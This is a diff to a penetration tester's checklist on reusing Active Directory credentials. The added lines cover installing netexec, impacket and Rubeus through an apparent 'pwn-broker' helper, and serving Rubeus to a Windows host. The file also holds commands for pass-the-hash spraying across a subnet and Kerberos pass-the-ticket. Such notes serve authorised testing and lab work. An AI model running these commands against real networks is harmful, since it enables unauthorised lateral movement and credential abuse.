@@ -6,6 +6,7 @@ sudo ntpdate <DCIP>
 - [ ] What I hold: a password, an NT hash to pass with no cracking, or a Kerberos ticket
 
 ## Where the credential works
+At the pwn-broker prompt: tool install netexec and tool install impacket.
 nxc smb <Subnet>/<CIDR> -u '<Username>' -p '<Password>'
 nxc smb <Subnet>/<CIDR> -u '<Username>' -H '<Hash>'
 nxc winrm <TargetIP> -u '<Username>' -p '<Password>'
@@ -47,6 +48,12 @@ impacket-ticketConverter THE-TICKET.kirbi THE-TICKET.ccache
 - [ ] -k wants the FQDN, never the IP, or it fails with a Kerberos error
 
 ## From a Windows shell
+At the pwn-broker prompt:
+tool install rubeus
+serve
+serve files rubeus
+On the Windows host:
+- [ ] Rubeus.exe fetched with the line serve files gives
 .\Rubeus.exe asktgt /user:<Username> /rc4:<Hash> /ptt
 .\Rubeus.exe ptt /ticket:THE-TICKET.kirbi
 Enter-PSSession -ComputerName <Hostname> -Credential <Domain>\<Username>
